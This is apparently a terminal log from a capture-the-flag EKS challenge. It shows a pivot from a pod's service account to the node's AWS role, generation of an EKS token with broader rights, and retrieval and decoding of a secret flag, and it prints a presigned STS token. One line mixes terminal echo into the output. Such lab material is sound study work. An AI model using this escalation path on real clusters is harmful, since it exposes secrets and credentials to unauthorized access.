$ kubectl whoami
system:serviceaccount:challenge4:service-account-challenge4


$ kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]


$ aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}


$ aws eks get-token --cluster-name eks-challenge-cluser
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-12-14T21:46:11Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1XUkhOM0RTTSUyRjIwMjMxMjE0JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMTRUMjEzMjExWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFUCUyRiUyRiUyRiUyRiUyRiUyRiUyRiUyRiUyRiUyRiUyRndFYURDWXRPbnN2Nk4yTkoxUEVpeUszQVF1SHE2WFNhN1ZTRGdEWmZjckVqb2RuMFQxZjRrVnhWUEt5NVJLbzhxVHA2d2kwNHVuR2wwSUpsaUJjaTJzSTliTXlxd0lleVc1YnZwemhmRTRvTkxZWWRkbXVlNk9qTkhVdCUyQkNQQkowNURIclpKRmhoeGdLd1lPYyUyRkJ1QjJadnM1U0UySzByUyUyQkRTUmhlUDZHTXFYRlc3ZU9ZNTNQcXo3SSUyQjdmMkQ3ako0N2M3Z2p3SHdENEZ6cm9IcktWJTJCMjN5OU9rV2J2aENJUUtOYXpGdDJKTVNQZ1ByTFEwWmFSRXFYb3JrM1pHZWxlQWxUYk54ajVDU2lXNSUyQjJyQmpJdEF3aEh5WnZ0b3ZKeFpKMVZVZ0pqM2FJd3VpV3JqMEtGTXlPUXQlMkZkcTRsZFkza1JKNTlRYnFDS2xKOEhnJlgtQW16LVNpZ25hdHVyZT03NjUyOTUyNjVjZWIzMDNjZmEwYmUzOWJkMzQ5M2NjMDc4YTE1YTYwN2FkMjhmNTE2ZTkzY2IyYWI0YjdhZDMx"
    }
}



$ aws eks get-token --cluster-name eks-challenge-cluser | jq -r '.status.token' | cut -d "." -f 2 | base64 -d
https://sts.us-west-1.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIA2AVYNEVMWRHN3DSM%2F20231214%2Fus-west-1%2Fsts%2Faws4_request&X-Amz-Date=20231214T213232Z&X-Amz-Expires=60&X-Amz-SignedHeaders=host%3Bx-k8s-aws-id&X-Amz-Security-Token=FwoGZXIvYXdzEP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDCYtOnsv6N2NJ1PEiyK3AQuHq6XSa7VSDgDZfcrEjodn0T1f4kVxVPKy5RKo8qTp6wi04unGl0IJliBci2sI9bMyqwIeyW5bvpzhfE4oNLYYddmue6OjNHUt%2BCPBJ05DHrZJFhhxgKwYOc%2FBuB2Zvs5SE2K0rS%2BDSRheP6GMqXFW7eOY53Pqz7I%2B7f2D7jJ47c7gjwHwD4FzroHrKV%2B23y9OkWbvhCIQKNazFt2JMSPgPrLQ0ZaREqXork3ZGeleAlTbNxj5CSiW5%2B2rBjItAwhHyZvtovJxZJ1VUgJj3aIwuiWrj0KFMyOQt%2Fdq4ldY3kRJ59QbqCKlJ8Hg&X-Amz-Signature=94f6e87ff9722d372f12897e5a9205d220bec9e3c4fe398ea3791a10da02a511root@wiz-ge-cluster | jq -r '.status.token') auth can-i --list--cluster-name eks-challeng
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]


$ kubectl --token $(aws eks get-token --cluster-name eks-challenge-cluster | jq -r '.status.token') get secrets -o yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T12:27:57Z"
    name: node-flag
    namespace: challenge4
    resourceVersion: "883574"
    uid: 26461a29-ec72-40e1-adc7-99128ce664f7
  type: Opaque
kind: List
metadata:
  resourceVersion: ""


$ kubectl --token $(aws eks get-token --cluster-name eks-challenge-cluster | jq -r '.status.token') get secrets -o json | jq -r '.items[].data.flag' | base64 -d
wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}

